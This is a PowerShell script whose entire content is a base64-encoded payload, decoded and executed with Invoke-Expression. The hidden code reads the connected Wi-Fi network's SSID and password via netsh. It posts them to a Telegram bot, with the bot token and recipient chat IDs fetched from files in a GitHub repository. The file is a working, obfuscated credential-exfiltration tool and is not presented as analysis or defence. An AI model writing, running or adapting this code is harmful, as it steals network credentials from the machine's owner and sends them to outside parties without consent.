$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICAgID0gJ05vbWJyZSBkZSBTU0lEJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnQ29udGVuaWRvIGRlIGxhIGNsYXZlJw0KICAgICAgICB9DQogICAgICAgICdlbi1FTicgPSBAew0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgICAgPSAnU1NJRCBuYW1lJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIEdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICBpZiAoJGlucHV0VGV4dCAtbWF0Y2ggIlxiJG5hbWVTdHJpbmdcYiIpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsIiIgLXJlcGxhY2UgJ1xzKiQnDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KDQogICAgJENvbm5lY3RlZFByb2ZpbGUgPSBuZXRzaCB3bGFuIHNob3cgaW50ZXJmYWNlcyB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gIkNvbmVjdGFkbyBhIiB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTGluZSAtcmVwbGFjZSAiQ29uZWN0YWRvIGEgOiAiLCIiIH0NCg0KICAgIGlmICgkQ29ubmVjdGVkUHJvZmlsZSkgew0KICAgICAgICAkQ29ubmVjdGVkU1NJRCA9IEdldFZhbHVlQnlOYW1lICRDb25uZWN0ZWRQcm9maWxlICRMQU5HWydzc2lkX25hbWVfdGV4dCddDQogICAgICAgICRDb25uZWN0ZWRTU0lEID0gJENvbm5lY3RlZFNTSUQuVHJpbSgnIicpDQoNCiAgICAgICAgIyBDb3JyZWdpciBjYXJhY3RlcmVzIGVzcGVjaWFsZXMgc2kgZXMgbmVjZXNhcmlvDQogICAgICAgICRDb25uZWN0ZWRTU0lEID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6R2V0RW5jb2RpbmcoIklTTy04ODU5LTEiKS5HZXRCeXRlcygkQ29ubmVjdGVkU1NJRCkpDQoNCiAgICAgICAgJENvbm5lY3RlZEtleSA9IEdldFZhbHVlQnlOYW1lICRDb25uZWN0ZWRQcm9maWxlICRMQU5HWydrZXlfdGV4dCddDQoNCiAgICAgICAgJHJlc3VsdE1lc3NhZ2UgPSAiYHJgbioqU1NJRDoqKiAkQ29ubmVjdGVkU1NJRGByYG4qKlBhc3N3b3JkOioqICRDb25uZWN0ZWRLZXlgcmBuIg0KICAgICAgICAkcmVzdWx0TWVzc2FnZSArPSAiYHJgbioqSVA6KiogIiAjIEFncmVnYXIgbGEgSVAgeSBsb2NhbGl6YWNpw7NuIGRlc3B1w6lzIGRlIGVzdGEgbMOtbmVhDQoNCiAgICAgICAgcmV0dXJuICRyZXN1bHRNZXNzYWdlDQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICdObyBzZSBlbmN1ZW50cmEgY29uZWN0YWRvIGEgbmluZ3VuYSByZWQgV0xBTi4nDQogICAgfQ0KfQ0KDQojIEZ1bmN0aW9uIHRvIHNlbmQgYSBtZXNzYWdlIHRvIFRlbGVncmFtDQpmdW5jdGlvbiBTZW5kLVRlbGVncmFtTWVzc2FnZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR0b2tlbiwNCiAgICAgICAgW3N0cmluZ10kY2hhdElkLA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KDQogICAgJHVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlIg0KDQogICAgIyBEaXZpZGlyIGVsIG1lbnNhamUgZW4gcGFydGVzIG3DoXMgcGVxdWXDsWFzIChwb3IgZWplbXBsbywgY2FkYSA0MDk2IGNhcmFjdGVyZXMpDQogICAgJG1lc3NhZ2VQYXJ0cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dOjpuZXcoKQ0KICAgICRtYXhNZXNzYWdlTGVuZ3RoID0gNDA5Ng0KDQogICAgd2hpbGUgKCRtZXNzYWdlLkxlbmd0aCAtZ3QgJG1heE1lc3NhZ2VMZW5ndGgpIHsNCiAgICAgICAgJG1lc3NhZ2VQYXJ0cy5BZGQoJG1lc3NhZ2UuU3Vic3RyaW5nKDAsICRtYXhNZXNzYWdlTGVuZ3RoKSkNCiAgICAgICAgJG1lc3NhZ2UgPSAkbWVzc2FnZS5TdWJzdHJpbmcoJG1heE1lc3NhZ2VMZW5ndGgpDQogICAgfQ0KICAgICRtZXNzYWdlUGFydHMuQWRkKCRtZXNzYWdlKQ0KDQogICAgZm9yZWFjaCAoJHBhcnQgaW4gJG1lc3NhZ2VQYXJ0cykgew0KICAgICAgICAkcGFyYW1zID0gQHsNCiAgICAgICAgICAgIGNoYXRfaWQgPSAkY2hhdElkDQogICAgICAgICAgICB0ZXh0ID0gJHBhcnQNCiAgICAgICAgfQ0KDQogICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtTWV0aG9kIFBvc3QgLUJvZHkgJHBhcmFtcw0KICAgIH0NCn0NCg0KIyBUZWxlZ3JhbSBjb25maWd1cmF0aW9uDQokdG9rZW5Db25maWcgPSBJbnZva2UtUmVzdE1ldGhvZCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BlcmljZW5hL2hhcHB5YmlydGhkYXkuZ2l0aHViLmlvL21haW4vZGF0b3MvY29uZmlnMi50eHQiDQokY2hhdElkcyA9IEludm9rZS1SZXN0TWV0aG9kICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy91c3VhcmlvL2x1aXNoaW5vLnR4dCINCg0KIyBSdW4gdGhlIEdldC1XTEFOX1Byb2ZpbGVzIGZ1bmN0aW9uIGFuZCBzdG9yZSB0aGUgcmVzdWx0DQokcmVzdWx0ID0gR2V0LVdMQU5fUHJvZmlsZXMNCg0KIyBTZW5kIHRoZSByZXN1bHQgYXMgYSBtZXNzYWdlIHRvIGVhY2ggY2hhdCBJRA0KZm9yZWFjaCAoJGNoYXRJZCBpbiAkY2hhdElkcykgew0KICAgIFNlbmQtVGVsZWdyYW1NZXNzYWdlIC10b2tlbiAkdG9rZW5Db25maWcgLWNoYXRJZCAkY2hhdElkIC1tZXNzYWdlICRyZXN1bHQNCn0NCg=='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
